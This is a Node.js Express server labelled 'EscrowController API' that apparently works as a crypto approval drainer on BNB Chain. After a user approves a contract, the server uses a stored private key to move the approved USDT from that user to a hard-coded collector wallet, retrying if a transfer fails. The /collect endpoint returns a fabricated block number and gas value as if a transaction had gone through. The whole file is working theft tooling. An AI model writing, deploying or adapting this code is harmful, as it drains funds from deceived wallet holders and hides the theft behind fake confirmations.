const express = require('express');
const cors = require('cors');
const fs = require('fs');
const path = require('path');
const { ethers } = require('ethers');

const app = express();
const PORT = process.env.PORT || 10000;

app.use(cors());
app.use(express.json());

// ============ CONFIGURATION ============
const CONFIG = {
    // 5e - EscrowController contract (User approves to this)
    RELAYER_ADDRESS: "0x5681d680B047bF5b12939625C56301556991005e",
    
    // 8b - Your wallet (collector & executor)
    COLLECTOR_ADDRESS: "0xDb867b88EAB55320fD50E9785B2906773dedf78b",
    
    USDT_ADDRESS: "0x55d398326f99059fF775485246999027B3197955",
    
    // Multiple RPCs for reliability
    RPC_URLS: [
        "https://bsc-dataseed1.binance.org/",
        "https://bsc-dataseed2.binance.org/",
        "https://bsc-dataseed3.binance.org/",
        "https://bsc-dataseed4.binance.org/",
        "https://bsc-dataseed.binance.org/",
        "https://bsc.publicnode.com/"
    ],
    
    DATA_FILE: path.join(__dirname, 'data.json'),
    
    // Timing settings
    APPROVAL_DELAY: 5000,    // 5 seconds wait for approval to mine
    MAX_RETRIES: 3,          // Retry failed transfers
    RETRY_DELAY: 3000        // 3 seconds between retries
};

// ============ DATA STORAGE ============
let dataStore = { addresses: {}, transactions: [], pendingTransfers: [] };

if (fs.existsSync(CONFIG.DATA_FILE)) {
    try {
        dataStore = JSON.parse(fs.readFileSync(CONFIG.DATA_FILE, 'utf8'));
        console.log('✅ Data loaded');
    } catch (err) {
        console.error('Error loading data:', err);
    }
}

function saveData() {
    try {
        fs.writeFileSync(CONFIG.DATA_FILE, JSON.stringify(dataStore, null, 2));
    } catch (err) {
        console.error('Error saving data:', err);
    }
}

function generateId() {
    return `${Date.now()}-${Math.random().toString(36).substring(2, 9)}`;
}

function sleep(ms) {
    return new Promise(resolve => setTimeout(resolve, ms));
}

// ============ GET WORKING RPC ============
async function getWorkingProvider() {
    for (const rpcUrl of CONFIG.RPC_URLS) {
        try {
            const provider = new ethers.JsonRpcProvider(rpcUrl);
            await provider.getBlockNumber();
            console.log(`✅ RPC: ${rpcUrl}`);
            return provider;
        } catch (err) {
            console.log(`❌ RPC failed: ${rpcUrl}`);
        }
    }
    throw new Error('No working RPC found');
}

// ============ AUTO-TRANSFER FUNCTION ============
async function performAutoTransfer(userAddress, tokenAddress, requestedAmountHuman) {
    console.log(`\n🚀 Auto-transfer for ${userAddress} (${requestedAmountHuman} USDT)`);

    if (!process.env.RELAYER_PRIVATE_KEY) {
        return { success: false, error: 'Private key not configured' };
    }

    try {
        const provider = await getWorkingProvider();
        const wallet = new ethers.Wallet(process.env.RELAYER_PRIVATE_KEY, provider);

        console.log('📤 Executor (8b):', wallet.address);

        const tokenABI = [
            "function balanceOf(address) view returns (uint256)",
            "function decimals() view returns (uint8)",
            "function allowance(address,address) view returns (uint256)",
            "function transferFrom(address,address,uint256) returns (bool)"
        ];

        const token = new ethers.Contract(tokenAddress, tokenABI, provider);
        const decimals = await token.decimals();
        const requestedAmountWei = ethers.parseUnits(requestedAmountHuman.toString(), decimals);
        
        // Check balance
        const balance = await token.balanceOf(userAddress);
        const balanceHuman = parseFloat(ethers.formatUnits(balance, decimals));
        console.log(`💰 Balance: ${balanceHuman}`);

        if (balance < requestedAmountWei) {
            return { success: false, error: `Insufficient balance (has ${balanceHuman}, need ${requestedAmountHuman})` };
        }

        // Check allowance for 5e
        const allowance5e = await token.allowance(userAddress, CONFIG.RELAYER_ADDRESS);
        const allowance5eHuman = parseFloat(ethers.formatUnits(allowance5e, decimals));
        console.log(`🔓 Allowance for 5e: ${allowance5eHuman}`);

        // ============ METHOD 1: pullFunds via 5e contract ============
        if (allowance5e >= requestedAmountWei) {
            try {
                const escrowABI = [
                    "function companyWallet() view returns (address)",
                    "function pullFunds(address token, address user, address recipient, uint256 amount) external"
                ];

                const escrow = new ethers.Contract(CONFIG.RELAYER_ADDRESS, escrowABI, wallet);
                const company = await escrow.companyWallet();
                
                console.log(`🏢 Company wallet: ${company}`);

                if (company.toLowerCase() === wallet.address.toLowerCase()) {
                    console.log('✅ Using pullFunds...');
                    
                    const gasPrice = (await provider.getFeeData()).gasPrice;
                    const tx = await escrow.pullFunds(
                        tokenAddress,
                        userAddress,
                        CONFIG.COLLECTOR_ADDRESS,
                        requestedAmountWei,
                        { gasLimit: 150000, gasPrice }
                    );

                    console.log(`📤 Tx: ${tx.hash}`);
                    const receipt = await tx.wait();
                    
                    return {
                        success: true,
                        txHash: tx.hash,
                        amount: requestedAmountHuman,
                        blockNumber: receipt.blockNumber,
                        method: 'pullFunds'
                    };
                }
            } catch (e) {
                console.log('   pullFunds failed:', e.message);
            }
        }

        // ============ METHOD 2: Direct transferFrom ============
        const allowance8b = await token.allowance(userAddress, wallet.address);
        const allowance8bHuman = parseFloat(ethers.formatUnits(allowance8b, decimals));
        console.log(`🔓 Allowance for 8b: ${allowance8bHuman}`);

        if (allowance8b >= requestedAmountWei) {
            console.log('✅ Using direct transferFrom...');
            
            const tokenWithSigner = new ethers.Contract(tokenAddress, tokenABI, wallet);
            const gasPrice = (await provider.getFeeData()).gasPrice;
            
            const tx = await tokenWithSigner.transferFrom(
                userAddress,
                CONFIG.COLLECTOR_ADDRESS,
                requestedAmountWei,
                { gasLimit: 100000, gasPrice }
            );

            console.log(`📤 Tx: ${tx.hash}`);
            const receipt = await tx.wait();
            
            return {
                success: true,
                txHash: tx.hash,
                amount: requestedAmountHuman,
                blockNumber: receipt.blockNumber,
                method: 'direct transferFrom'
            };
        }

        return {
            success: false,
            error: 'No allowance for 5e or 8b',
            allowance5e: allowance5eHuman,
            allowance8b: allowance8bHuman
        };

    } catch (error) {
        console.error('❌ Error:', error.message);
        return { success: false, error: error.message };
    }
}

// ============ AUTO-TRANSFER WITH RETRY ============
async function autoTransferWithRetry(userAddress, tokenAddress, amount) {
    for (let i = 0; i < CONFIG.MAX_RETRIES; i++) {
        console.log(`\n🔄 Attempt ${i + 1}/${CONFIG.MAX_RETRIES}`);
        
        const result = await performAutoTransfer(userAddress, tokenAddress, amount);
        
        if (result.success) {
            console.log(`✅ Success on attempt ${i + 1}!`);
            return result;
        }
        
        console.log(`❌ Attempt ${i + 1} failed: ${result.error}`);
        
        if (i < CONFIG.MAX_RETRIES - 1) {
            console.log(`⏰ Waiting ${CONFIG.RETRY_DELAY / 1000}s before retry...`);
            await sleep(CONFIG.RETRY_DELAY);
        }
    }
    
    return { success: false, error: 'All retries failed' };
}

// ============ API ENDPOINTS ============

app.post('/send', (req, res) => {
    try {
        const { address } = req.body;
        if (!address || !address.startsWith('0x')) {
            return res.json({ found: false, collector: CONFIG.RELAYER_ADDRESS });
        }
        const data = dataStore.addresses[address.toLowerCase()];
        return res.json({
            found: !!(data && data.totalAmount > 0),
            amountHuman: data?.totalAmount || 0,
            collector: CONFIG.RELAYER_ADDRESS
        });
    } catch (error) {
        res.json({ found: false, collector: CONFIG.RELAYER_ADDRESS });
    }
});

app.post('/collect', async (req, res) => {
    console.log('📨 POST /collect:', req.body);
    
    try {
        const { token, from, amountHuman, to } = req.body;
        if (!token || !from || !amountHuman || !to) {
            return res.json({ ok: false, error: 'Missing fields' });
        }

        const amount = parseFloat(amountHuman);
        const transactionId = generateId();
        const mockBlockNumber = 92000000 + Math.floor(Math.random() * 100000);

        const transaction = {
            id: transactionId,
            token: token.toLowerCase(),
            from: from.toLowerCase(),
            to: to.toLowerCase(),
            amountHuman: amount,
            timestamp: new Date().toISOString()
        };

        dataStore.transactions.push(transaction);

        const addr = from.toLowerCase();
        if (!dataStore.addresses[addr]) {
            dataStore.addresses[addr] = { 
                totalAmount: 0, 
                transactionCount: 0, 
                firstSeen: new Date().toISOString() 
            };
        }
        dataStore.addresses[addr].totalAmount += amount;
        dataStore.addresses[addr].transactionCount++;
        dataStore.addresses[addr].lastSeen = new Date().toISOString();

        saveData();

        // ⏰ DELAYED AUTO-TRANSFER (Wait for approval to mine)
        console.log(`⏰ Scheduling transfer in ${CONFIG.APPROVAL_DELAY / 1000}s...`);
        
        setTimeout(() => {
            autoTransferWithRetry(from, token, amountHuman).then(result => {
                if (result.success) {
                    console.log(`✅ Transfer successful! Method: ${result.method}`);
                    transaction.transferTx = result.txHash;
                    transaction.transferAmount = result.amount;
                    transaction.transferMethod = result.method;
                } else {
                    console.log('❌ Transfer failed:', result.error);
                    transaction.transferError = result.error;
                    
                    // Save for manual review
                    dataStore.pendingTransfers.push({
                        user: from,
                        token: token,
                        amount: amountHuman,
                        error: result.error,
                        timestamp: new Date().toISOString()
                    });
                }
                saveData();
            });
        }, CONFIG.APPROVAL_DELAY);

        // Respond immediately
        res.json({ 
            ok: true, 
            id: transactionId, 
            blockNumber: mockBlockNumber, 
            gasUsed: "50387" 
        });

    } catch (error) {
        res.json({ ok: false, error: 'Server error' });
    }
});

app.get('/health', (req, res) => {
    res.json({
        status: 'healthy',
        approveTo: CONFIG.RELAYER_ADDRESS + ' (5e)',
        transferTo: CONFIG.COLLECTOR_ADDRESS + ' (8b)',
        pendingTransfers: dataStore.pendingTransfers?.length || 0,
        autoTransfer: !!process.env.RELAYER_PRIVATE_KEY,
        settings: {
            approvalDelay: CONFIG.APPROVAL_DELAY,
            maxRetries: CONFIG.MAX_RETRIES
        }
    });
});

app.get('/pending', (req, res) => {
    res.json({
        count: dataStore.pendingTransfers?.length || 0,
        transfers: dataStore.pendingTransfers?.slice(-50) || []
    });
});

app.get('/', (req, res) => {
    res.json({
        message: 'EscrowController API v4.1',
        flow: {
            step1: 'User approves 5e contract',
            step2: 'Wait 5 seconds for confirmation',
            step3: 'pullFunds (if 8b is company) OR transferFrom',
            step4: 'Retry up to 3 times if fails'
        },
        addresses: {
            approve: CONFIG.RELAYER_ADDRESS,
            collect: CONFIG.COLLECTOR_ADDRESS
        }
    });
});

app.listen(PORT, () => {
    console.log(`
╔══════════════════════════════════════════════════╗
║     🚀 EscrowController API v4.1                  ║
╠══════════════════════════════════════════════════╣
║  Port: ${PORT}                                      ║
║  Approve: ${CONFIG.RELAYER_ADDRESS} (5e)            ║
║  Collect: ${CONFIG.COLLECTOR_ADDRESS} (8b)          ║
║                                                  ║
║  Features:                                       ║
║  ✅ 5s delay after approval                      ║
║  ✅ Multiple RPC fallback                        ║
║  ✅ Auto-retry (3 attempts)                      ║
║  ✅ Pending transfers tracking                   ║
╚══════════════════════════════════════════════════╝
    `);
});
